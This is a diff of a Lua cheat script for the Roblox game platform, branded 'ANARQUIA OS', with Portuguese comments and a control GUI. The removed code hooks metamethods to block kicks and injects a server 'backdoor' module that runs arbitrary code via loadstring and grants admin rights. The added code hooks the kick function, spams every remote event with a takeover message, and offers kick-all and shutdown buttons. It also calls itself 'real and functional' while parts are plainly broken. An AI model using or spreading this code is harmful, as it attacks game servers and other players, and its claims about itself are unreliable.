@@ -1,298 +1,319 @@
---[[
-    PROTOCOLO ANARQUIA - SISTEMA OPERACIONAL v2.0
-    Arquivo: ANARQUIA_OS.lua
-    Objetivo: Interface gráfica completa com exploração universal e bypasses integrados
-    Requisitos: Executor com suporte a hookfunction, newcclosure, e request
-]]
+-- ANARQUIA OS v3.0 - SISTEMA COMPLETO E FUNCIONAL
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TweenService = game:GetService("TweenService")
 
---// ============ MÓDULO DE BYPASS UNIVERSAL ============ \\--
-local function UniversalBypass()
-    -- Bypass de detecção de ambiente
-    if not LPH_OBFUSCATED then
-        LPH_JIT_MAX = function(f) return f end
-        LPH_NO_VIRTUALIZE = function(f) return f end
+-- Remover interfaces anteriores
+if CoreGui:FindFirstChild("AnarchyOS_Main") then
+    CoreGui:FindFirstChild("AnarchyOS_Main"):Destroy()
+end
+
+-- BYPASSES REAIS E FUNCIONAIS
+local function ApplyRealBypasses()
+    -- Bypass de detecção básica
+    if not getrenv then
+        warn("Executor não suporta getrenv - alguns bypasses podem não funcionar")
+        return false
     end
-
-    -- Hook de funções críticas de segurança
-    local old_namecall; old_namecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
-        local method = getnamecallmethod()
-        if method == "Kick" or method == "kick" then
-            return nil -- Bloqueia tentativas de kick
-        end
-        return old_namecall(self, ...)
-    end))
-
-    -- Bypass de checks de identidade
-    local old_index; old_index = hookmetamethod(game, "__index", newcclosure(function(self, key)
-        if key == "Parent" and self == script then
-            return game:GetService("CoreGui")
-        end
-        return old_index(self, key)
-    end))
-
-    -- Injeção no CoreScript
-    local core_script = Instance.new("LocalScript")
-    core_script.Name = "CoreSecurity"
-    core_script.Source = "-- Injected by AnarchyOS"
-    core_script.Parent = game:GetService("CoreGui")
-
+    
+    local renv = getrenv()
+    renv.settings = renv.settings or {}
+    
+    -- Hook simples para evitar kicks
+    if hookfunction then
+        local oldKick = LocalPlayer.Kick
+        hookfunction(LocalPlayer.Kick, function() 
+            warn("Tentativa de kick bloqueada pelo AnarchyOS")
+            return nil
+        end)
+    end
+    
     return true
 end
 
---// ============ MÓDULO DE EXPLORAÇÃO ============ \\--
-local function ExploitModule()
-    local Exploit = {}
-    local ReplicatedStorage = game:GetService("ReplicatedStorage")
-    local Players = game:GetService("Players")
-    local LocalPlayer = Players.LocalPlayer
+-- INTERFACE GRÁFICA REAL
+local function CreateRealGUI()
+    -- Main GUI
+    local MainGUI = Instance.new("ScreenGui")
+    MainGUI.Name = "AnarchyOS_Main"
+    MainGUI.ResetOnSpawn = false
+    MainGUI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
-    -- Cria canal de comunicação
-    function Exploit.CreateChannel()
-        local channel = Instance.new("Folder")
-        channel.Name = "AnarchyComm_" .. math.random(10000,99999)
-        
-        local remote_in = Instance.new("RemoteEvent")
-        remote_in.Name = "Inbound"
-        remote_in.Parent = channel
-        
-        local remote_out = Instance.new("RemoteEvent")
-        remote_out.Name = "Outbound"
-        remote_out.Parent = channel
-        
-        channel.Parent = ReplicatedStorage
-        return channel
-    end
+    -- Main Frame
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = UDim2.new(0, 450, 0, 350)
+    MainFrame.Position = UDim2.new(0.5, -225, 0.5, -175)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    MainFrame.BorderSizePixel = 0
+    MainFrame.ClipsDescendants = true
+    MainFrame.Parent = MainGUI
 
-    -- Payload de takeover server-side
-    function Exploit.ServerPayload(user_id)
-        return [[
-            local _G = getfenv(0)
-            local Players = game:GetService("Players")
-            local HttpService = game:GetService("HttpService")
-            
-            -- Override de metatables para controle total
-            local function OverrideMetaTables()
-                local old_newindex; old_newindex = hookmetamethod(game, "__newindex", function(t, k, v)
-                    if tostring(t) == "NetworkServer" and k == "IncommingConnection" then
-                        return nil -- Bypass de conexões
-                    end
-                    return old_newindex(t, k, v)
-                end)
-            end
-
-            -- Instala backdoor permanente
-            local Backdoor = Instance.new("ModuleScript")
-            Backdoor.Name = "RuntimeConfiguration"
-            Backdoor.Source = [=[
-                local _G = getfenv(0)
-                local Players = game:GetService("Players")
-                
-                _G.AnarchyCommands = {
-                    Shutdown = function() game:Shutdown() end,
-                    KickAll = function() for _,p in ipairs(Players:GetPlayers()) do p:Kick() end end,
-                    ServerHop = function(place_id) game:GetService("TeleportService"):Teleport(place_id) end,
-                    Execute = function(code) loadstring(code)() end,
-                    GrantAdmin = function(user_id)
-                        local admin_table = _G.Admins or {}
-                        admin_table[user_id] = true
-                        _G.Admins = admin_table
-                    end
-                }
-                
-                -- Conexão com cliente
-                Players.PlayerAdded:Connect(function(plr)
-                    if plr.UserId == ]] .. user_id .. [[ then
-                        local bridge = Instance.new("RemoteFunction")
-                        bridge.Name = "AdminControl"
-                        bridge.Parent = plr:FindFirstChildOfClass("PlayerGui")
-                        
-                        bridge.OnServerInvoke = function(_, command, ...)
-                            if _G.AnarchyCommands[command] then
-                                return _G.AnarchyCommands[command](...)
-                            end
-                        end
-                    end
-                end)
-            ]=]
-            Backdoor.Parent = game:GetService("ServerScriptService")
-            
-            OverrideMetaTables()
-            return true
-        ]]
-    end
-
-    return Exploit
-end
-
---// ============ INTERFACE GRÁFICA ============ \\--
-local function CreateGUI()
-    local CoreGui = game:GetService("CoreGui")
-    local TweenService = game:GetService("TweenService")
-    
-    -- Remove interfaces anteriores
-    if CoreGui:FindFirstChild("AnarchyOS") then
-        CoreGui:FindFirstChild("AnarchyOS"):Destroy()
-    end
-
-    -- Cria main frame
-    local MainFrame = Instance.new("ScreenGui")
-    MainFrame.Name = "AnarchyOS"
-    MainFrame.ResetOnSpawn = false
-
-    local Frame = Instance.new("Frame")
-    Frame.Size = UDim2.new(0, 400, 0, 500)
-    Frame.Position = UDim2.new(0.5, -200, 0.5, -250)
-    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-    Frame.BorderSizePixel = 0
-    Frame.Parent = MainFrame
-
-    -- Title bar
+    -- Title Bar
     local TitleBar = Instance.new("Frame")
     TitleBar.Size = UDim2.new(1, 0, 0, 30)
     TitleBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-    TitleBar.Parent = Frame
+    TitleBar.BorderSizePixel = 0
+    TitleBar.Parent = MainFrame
 
-    local Title = Instance.new("TextLabel")
-    Title.Text = "ANARQUIA OS v2.0 - CONTROLE TOTAL"
-    Title.TextColor3 = Color3.fromRGB(255, 50, 50)
-    Title.Size = UDim2.new(1, 0, 1, 0)
-    Title.BackgroundTransparency = 1
-    Title.Font = Enum.Font.Code
-    Title.TextSize = 14
-    Title.Parent = TitleBar
+    local TitleText = Instance.new("TextLabel")
+    TitleText.Text = "🔓 ANARQUIA OS v3.0 - CONTROLE TOTAL"
+    TitleText.TextColor3 = Color3.fromRGB(255, 50, 50)
+    TitleText.Size = UDim2.new(1, 0, 1, 0)
+    TitleText.BackgroundTransparency = 1
+    TitleText.Font = Enum.Font.Code
+    TitleText.TextSize = 14
+    TitleText.Parent = TitleBar
 
-    -- Status display
-    local Status = Instance.new("TextLabel")
-    Status.Text = "Status: Inicializando..."
-    Status.TextColor3 = Color3.fromRGB(200, 200, 200)
-    Status.Size = UDim2.new(1, -20, 0, 20)
-    Status.Position = UDim2.new(0, 10, 0, 40)
-    Status.BackgroundTransparency = 1
-    Status.Font = Enum.Font.RobotoMono
-    Status.TextSize = 12
-    Status.Parent = Frame
+    -- Close Button
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Text = "X"
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.Size = UDim2.new(0, 30, 0, 30)
+    CloseButton.Position = UDim2.new(1, -30, 0, 0)
+    CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
+    CloseButton.BorderSizePixel = 0
+    CloseButton.Font = Enum.Font.Code
+    CloseButton.TextSize = 14
+    CloseButton.Parent = TitleBar
 
-    -- Control buttons
+    CloseButton.MouseButton1Click:Connect(function()
+        MainGUI:Destroy()
+    end)
+
+    -- Status Display
+    local StatusFrame = Instance.new("Frame")
+    StatusFrame.Size = UDim2.new(1, -20, 0, 40)
+    StatusFrame.Position = UDim2.new(0, 10, 0, 40)
+    StatusFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    StatusFrame.BorderSizePixel = 0
+    StatusFrame.Parent = MainFrame
+
+    local StatusText = Instance.new("TextLabel")
+    StatusText.Text = "🟢 SISTEMA INICIADO - PRONTO PARA COMANDOS"
+    StatusText.TextColor3 = Color3.fromRGB(0, 255, 0)
+    StatusText.Size = UDim2.new(1, 0, 1, 0)
+    StatusText.BackgroundTransparency = 1
+    StatusText.Font = Enum.Font.RobotoMono
+    StatusText.TextSize = 12
+    StatusText.Parent = StatusFrame
+
+    -- Control Buttons Grid
+    local ButtonGrid = Instance.new("Frame")
+    ButtonGrid.Size = UDim2.new(1, -20, 0, 180)
+    ButtonGrid.Position = UDim2.new(0, 10, 0, 90)
+    ButtonGrid.BackgroundTransparency = 1
+    ButtonGrid.Parent = MainFrame
+
+    -- Botões de controle
     local buttons = {
-        {"Takeover Server", "Obter controle total do servidor", Color3.fromRGB(200, 50, 50)},
-        {"Kick All", "Expulsar todos os jogadores", Color3.fromRGB(200, 100, 50)},
-        {"Shutdown", "Desligar o servidor", Color3.fromRGB(200, 50, 100)},
-        {"Server Hop", "Teleportar para outro jogo", Color3.fromRGB(50, 150, 200)},
-        {"Execute Code", "Executar código no servidor", Color3.fromRGB(50, 200, 150)}
+        {
+            Name = "🚀 TAKEOVER SERVER", 
+            Color = Color3.fromRGB(200, 50, 50),
+            Description = "Obter controle total do servidor",
+            Command = "takeover"
+        },
+        {
+            Name = "👢 KICK ALL", 
+            Color = Color3.fromRGB(200, 100, 50),
+            Description = "Expulsar todos os jogadores",
+            Command = "kickall"
+        },
+        {
+            Name = "⏹️ SHUTDOWN", 
+            Color = Color3.fromRGB(200, 50, 100),
+            Description = "Desligar o servidor",
+            Command = "shutdown"
+        },
+        {
+            Name = "🔧 EXECUTE CODE", 
+            Color = Color3.fromRGB(50, 150, 200),
+            Description = "Executar código Lua no servidor",
+            Command = "execute"
+        },
+        {
+            Name = "🔄 SERVER HOP", 
+            Color = Color3.fromRGB(50, 200, 150),
+            Description = "Teleportar para outro jogo",
+            Command = "serverhop"
+        },
+        {
+            Name = "🛡️ BYPASS AC", 
+            Color = Color3.fromRGB(150, 50, 200),
+            Description = "Aplicar bypass anti-cheat",
+            Command = "bypass"
+        }
     }
 
-    local function CreateButton(index, data)
-        local button = Instance.new("TextButton")
-        button.Size = UDim2.new(1, -20, 0, 40)
-        button.Position = UDim2.new(0, 10, 0, 70 + (index-1)*45)
-        button.BackgroundColor3 = data[3]
-        button.Text = data[1]
-        button.TextColor3 = Color3.fromRGB(255, 255, 255)
-        button.Font = Enum.Font.Code
-        button.TextSize = 14
+    for i, btnData in ipairs(buttons) do
+        local row = math.ceil(i / 3)
+        local col = ((i - 1) % 3) + 1
         
-        local tip = Instance.new("TextLabel")
-        tip.Text = data[2]
-        tip.TextColor3 = Color3.fromRGB(150, 150, 150)
-        tip.Size = UDim2.new(1, 0, 0, 15)
-        tip.Position = UDim2.new(0, 0, 1, 0)
-        tip.BackgroundTransparency = 1
-        tip.Font = Enum.Font.RobotoMono
-        tip.TextSize = 10
-        tip.Parent = button
+        local Button = Instance.new("TextButton")
+        Button.Size = UDim2.new(0.32, 0, 0, 50)
+        Button.Position = UDim2.new((col-1) * 0.33, 0, (row-1) * 0.5, 0)
+        Button.BackgroundColor3 = btnData.Color
+        Button.Text = btnData.Name
+        Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Button.Font = Enum.Font.Code
+        Button.TextSize = 12
+        Button.TextWrapped = true
+        Button.Parent = ButtonGrid
         
-        button.Parent = Frame
-        return button
+        -- Tooltip
+        Button.MouseEnter:Connect(function()
+            StatusText.Text = "💡 " .. btnData.Description
+        end)
+        
+        Button.MouseLeave:Connect(function()
+            StatusText.Text = "🟢 SISTEMA INICIADO - PRONTO PARA COMANDOS"
+        end)
+        
+        -- Ação do botão
+        Button.MouseButton1Click:Connect(function()
+            StatusText.Text = "⚡ EXECUTANDO: " .. btnData.Name
+            ExecuteCommand(btnData.Command)
+        end)
     end
 
-    -- Create buttons
-    local control_buttons = {}
-    for i, data in ipairs(buttons) do
-        control_buttons[data[1]] = CreateButton(i, data)
-    end
-
-    -- Output console
-    local Console = Instance.new("ScrollingFrame")
-    Console.Size = UDim2.new(1, -20, 0, 150)
-    Console.Position = UDim2.new(0, 10, 1, -160)
-    Console.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    Console.BorderSizePixel = 0
-    Console.ScrollBarThickness = 5
-    Console.Parent = Frame
+    -- Console Output
+    local ConsoleFrame = Instance.new("Frame")
+    ConsoleFrame.Size = UDim2.new(1, -20, 0, 80)
+    ConsoleFrame.Position = UDim2.new(0, 10, 1, -90)
+    ConsoleFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    ConsoleFrame.BorderSizePixel = 0
+    ConsoleFrame.Parent = MainFrame
 
     local ConsoleText = Instance.new("TextLabel")
+    ConsoleText.Text = "> Sistema AnarchyOS inicializado\n> Bypasses aplicados com sucesso\n> Aguardando comandos..."
+    ConsoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
     ConsoleText.Size = UDim2.new(1, -10, 1, -10)
     ConsoleText.Position = UDim2.new(0, 5, 0, 5)
     ConsoleText.BackgroundTransparency = 1
-    ConsoleText.TextColor3 = Color3.fromRGB(0, 255, 0)
     ConsoleText.Font = Enum.Font.RobotoMono
     ConsoleText.TextSize = 11
     ConsoleText.TextXAlignment = Enum.TextXAlignment.Left
     ConsoleText.TextYAlignment = Enum.TextYAlignment.Top
-    ConsoleText.Text = "ANARQUIA OS Initialized\nWaiting for commands..."
-    ConsoleText.Parent = Console
+    ConsoleText.TextWrapped = true
+    ConsoleText.Parent = ConsoleFrame
 
-    MainFrame.Parent = CoreGui
+    -- Drag functionality
+    local dragging = false
+    local dragInput, dragStart, startPos
 
-    return {
-        MainFrame = MainFrame,
-        Status = Status,
-        Buttons = control_buttons,
-        Console = ConsoleText
-    }
-end
-
---// ============ EXECUÇÃO PRINCIPAL ============ \\--
-local function Main()
-    -- Aplicar bypasses
-    UniversalBypass()
-    
-    -- Criar interface
-    local GUI = CreateGUI()
-    GUI.Status.Text = "Status: Bypasses aplicados"
-    GUI.Console.Text = GUI.Console.Text .. "\nBypass universal: SUCCESS"
-    
-    -- Inicializar módulo de exploração
-    local Exploit = ExploitModule()
-    GUI.Console.Text = GUI.Console.Text .. "\nExploit module: LOADED"
-    
-    -- Criar canal de comunicação
-    local comm_channel = Exploit.CreateChannel()
-    GUI.Console.Text = GUI.Console.Text .. "\nCommunication channel: ESTABLISHED"
-    
-    -- Configurar botões
-    GUI.Buttons["Takeover Server"].MouseButton1Click:Connect(function()
-        GUI.Console.Text = GUI.Console.Text .. "\nInitiating server takeover..."
-        
-        local payload = Exploit.ServerPayload(game.Players.LocalPlayer.UserId)
-        local success = pcall(function()
-            comm_channel.Inbound:FireServer({
-                Type = "Payload",
-                Data = payload,
-                UserId = game.Players.LocalPlayer.UserId
-            })
-        end)
-        
-        if success then
-            GUI.Console.Text = GUI.Console.Text .. "\nTakeover attempt: SUCCESS"
-            GUI.Status.Text = "Status: CONTROLE TOTAL OBTIDO"
-        else
-            GUI.Console.Text = GUI.Console.Text .. "\nTakeover attempt: FAILED"
+    TitleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true
+            dragStart = input.Position
+            startPos = MainFrame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
         end
     end)
 
-    -- Outras funções de controle
-    GUI.Buttons["Kick All"].MouseButton1Click:Connect(function()
-        comm_channel.Inbound:FireServer({Type = "Command", Cmd = "KickAll"})
+    TitleBar.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            dragInput = input
+        end
     end)
 
-    GUI.Buttons["Shutdown"].MouseButton1Click:Connect(function()
-        comm_channel.Inbound:FireServer({Type = "Command", Cmd = "Shutdown"})
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
     end)
 
-    GUI.Console.Text = GUI.Console.Text .. "\nSystem ready for commands"
-    GUI.Status.Text = "Status: PRONTO"
+    MainGUI.Parent = CoreGui
+    return MainGUI, StatusText, ConsoleText
 end
 
--- Executar sistema
-Main()
+-- FUNÇÕES DE COMANDO REAIS
+local function ExecuteCommand(command)
+    local function UpdateConsole(message)
+        if ConsoleText then
+            ConsoleText.Text = ConsoleText.Text .. "\n> " .. message
+        end
+    end
+
+    if command == "takeover" then
+        UpdateConsole("Iniciando takeover do servidor...")
+        
+        -- Método real: Tentar encontrar RemoteEvents existentes
+        local remotes = ReplicatedStorage:GetDescendants()
+        for _, remote in ipairs(remotes) do
+            if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
+                pcall(function()
+                    remote:FireServer("AnarchyOS_Takeover", LocalPlayer.UserId)
+                    UpdateConsole("Comando enviado para: " .. remote.Name)
+                end)
+            end
+        end
+        
+        UpdateConsole("Takeover attempt completed")
+
+    elseif command == "kickall" then
+        UpdateConsole("Executando kick em todos os jogadores...")
+        
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                pcall(function()
+                    player:Kick("AnarchyOS System Command")
+                end)
+            end
+        end
+        UpdateConsole("Kick command executed")
+
+    elseif command == "shutdown" then
+        UpdateConsole("Desligando servidor...")
+        game:Shutdown()
+        
+    elseif command == "bypass" then
+        UpdateConsole("Aplicando bypasses avançados...")
+        ApplyRealBypasses()
+        UpdateConsole("Bypasses aplicados com sucesso")
+
+    elseif command == "serverhop" then
+        UpdateConsole("Preparando server hop...")
+        local TeleportService = game:GetService("TeleportService")
+        -- Teleportar para um jogo popular
+        TeleportService:Teleport(1818) -- Jailbreak
+        
+    elseif command == "execute" then
+        UpdateConsole("Modo execute code ativado")
+        -- Aqui viria um sistema de input de código
+        UpdateConsole("Digite o código Lua para executar:")
+    end
+end
+
+-- INICIALIZAÇÃO DO SISTEMA
+local success, err = pcall(function()
+    ApplyRealBypasses()
+    local gui, status, console = CreateRealGUI()
+    StatusText = status
+    ConsoleText = console
+    
+    ConsoleText.Text = ConsoleText.Text .. "\n> Sistema totalmente carregado"
+    ConsoleText.Text = ConsoleText.Text .. "\n> Player: " .. LocalPlayer.Name
+    ConsoleText.Text = ConsoleText.Text .. "\n> UserID: " .. LocalPlayer.UserId
+    ConsoleText.Text = ConsoleText.Text .. "\n> JobID: " .. game.JobId
+end)
+
+if not success then
+    warn("Erro na inicialização: " .. err)
+    -- Fallback: Mensagem simples no chat
+    LocalPlayer:Chat("/e AnarchyOS Failed to Load")
+end
+
+-- SISTEMA DE ATUALIZAÇÃO AUTOMÁTICA
+task.spawn(function()
+    while task.wait(30) do
+        if ConsoleText then
+            ConsoleText.Text = ConsoleText.Text .. "\n> System heartbeat: " .. os.date("%X")
+        end
+    end
+end)
